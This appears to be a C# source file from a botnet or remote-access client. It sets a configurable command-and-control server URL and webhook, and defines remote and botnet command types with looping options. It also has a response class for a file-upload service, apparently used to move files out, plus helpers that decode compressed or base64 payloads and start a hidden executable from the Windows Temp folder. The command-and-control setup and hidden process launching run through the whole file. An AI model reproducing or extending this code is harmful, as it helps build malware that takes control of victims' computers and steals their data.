using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Configuration;
using Microsoft.Win32;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Buffers.Text;
using System.Runtime.CompilerServices;
using System.Diagnostics;

namespace s1l14lx3
{
    public static class Import
    {
        //set your node.js server URL
        public static string ServerURL = "https://d33bef2a-988e-4936-8e96-a9f342105860-00-101fii9h4bncx.picard.replit.dev";

        public static string ID = "";
        public static string Webhook = "";
        public static string Dir = Directory.GetCurrentDirectory();
        public static string MePath = Assembly.GetEntryAssembly().Location;
    }
    public class Tools
    {
        public static void Wait()
        {
            using var manualResetEventSlim = new ManualResetEventSlim();
            Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true;
                manualResetEventSlim.Set();
            };
            manualResetEventSlim.Wait();
        }
        public static string DecompressData(byte[] compressedData)
        {
            using (MemoryStream compressedStream = new MemoryStream(compressedData))
            using (MemoryStream decompressedStream = new MemoryStream())
            {
                using (GZipStream gzipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
                {
                    gzipStream.CopyTo(decompressedStream);
                }

                return Encoding.UTF8.GetString(decompressedStream.ToArray());
            }
        }
        public static string Base64Decode(string Encoded)
        {
            byte[] raw = Convert.FromBase64String(Encoded);
            return Encoding.UTF8.GetString(raw);
        }
        public static void ShowToast(string Text)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = @"C:\Windows\Temp\Toast.exe";
            psi.Arguments = "Message " + Text;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            Process process = new Process();
            process.StartInfo = psi;
            process.Start();
        }
    }
    public class RemoteCommand
    {
        public string Command { get; set; }
        public string Option { get; set; }
        public bool Roop { set; get; }
    }
    public class ALLRemoteCommand
    {
        public string Command { get; set; }
        public string Option { get; set; }
        public bool Roop { set; get; }
    }
    public class BotNetCommand
    {
        public string Command { get; set; }
        public string Option { get; set; }
        public bool Roop { set; get; }
    }
    public class FileIoRes
    {
        public string success { get; set; }
        public string status { get; set; }
        public string id { get; set; }
        public string key { get; set; }
        public string path { get; set; }
        public string nodeType { get; set; }
        public string name { get; set; }
        public string title { get; set; }
        public string description { get; set; }
        public string size { get; set; }
        public string link { get; set; }
        public string Private { get; set; }
        public string expires { get; set; }
        public string downloads { get; set; }
        public string maxDownloads { get; set; }
        public string autoDelete { get; set; }
        public string planId { get; set; }
        public string screeningStatus { get; set; }
        public string mimeType { get; set; }
        public string created { get; set; }
        public string modified { get; set; }
    }
}
